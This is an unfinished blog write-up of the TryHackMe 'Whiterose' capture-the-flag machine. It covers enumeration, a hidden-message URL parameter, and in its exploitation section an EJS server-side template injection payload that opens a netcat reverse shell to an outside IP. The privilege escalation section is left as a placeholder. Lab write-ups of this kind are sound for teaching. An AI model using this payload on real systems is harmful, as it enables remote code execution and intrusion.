---
title: "Whiterose"
date: null
draft: true
categories:
  - TryHackMe
---


First writeup in 2025 and first one in a while so I went in with an easy machine in one of my favorite themes, **Mr Robot**. We will explore the Whiterose's machine today.

"Welcome to whiterose

This challenge is based on the Mr. Robot episode "409 Conflict". Contains spoilers!

Go ahead and start the machine**, it may take a few minutes to fully start up.**

And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`""


## Enumeration

we do what we do best...we poke around

```rustscan
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

We are redirected to `http://cyprusbank.thm/` so we ad that to our `/etc/hosts` and continue exploring the website.

It says it's under maintenance which is quite interesting


Some subdomain enumeration led us to

```
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 131ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 134ms]
:: Progress: [19966/19966] :: Job [1/1] :: 303 req/sec :: Duration: [0:01:04] :: Errors: 0 ::
```
Remember to add to `hosts` file folks

You guessed right the admin subdomain takes us to a dashboard login panel

Try the provided credentials out of instinct and Boom!

From there many possibilities but first the "search" page.
This one took a bit

On the "messages" page I FINALLY noticed `http://admin.cyprusbank.thm/messages/?c=5`
in the url...it seems to work like an index from where chat messages are shown
put the hidden parameter to 0 reveals the hidden chat messages

We login as Gayle (nice dev with a strong password policy) and can finally access the "settings" page and also get Tyrell Wellick phone number

## Exploitation

This took a lot of researching but the answer is simple: `STTI` in `ejs` on the settings page.
Do some searching

`&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 10.23.10.126 4444');s`


## Privilege escalation

content
